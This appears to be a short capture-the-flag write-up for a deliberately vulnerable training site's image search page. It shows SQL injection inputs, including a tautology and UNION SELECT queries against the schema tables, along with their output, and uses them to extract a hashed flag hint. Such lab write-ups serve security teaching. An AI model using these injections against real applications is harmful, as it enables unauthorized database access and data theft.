# Image Search

# Image Search

Something similar to member-search I think

`1 or 1` gives all images in database

```
ID: 1 or 1
Title: Nsa
Url : https://www.nsa.org/img.jpg

ID: 1 or 1
Title: 42 !
Url : https://www.42.fr/42.png

ID: 1 or 1
Title: Google
Url : https://www.google.fr/google.png

ID: 1 or 1
Title: Obama
Url : https://www.obama.org/obama.jpg

ID: 1 or 1
Title: Hack me ?
Url : borntosec.ddns.net/images.png

ID: 1 or 1
Title: tr00l
Url : https://www.h4x0r3.0rg/tr0ll.png
```

Same as user search:

```
ID: 1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
Title: id
Url : list_images

ID: 1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
Title: url
Url : list_images

ID: 1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
Title: title
Url : list_images

ID: 1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
Title: comment
Url : list_images
```

Querying for more information gives us this

```
ID: 1 union select title, comment from list_images
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?
```

Run that through a google search and you get `albatroz`
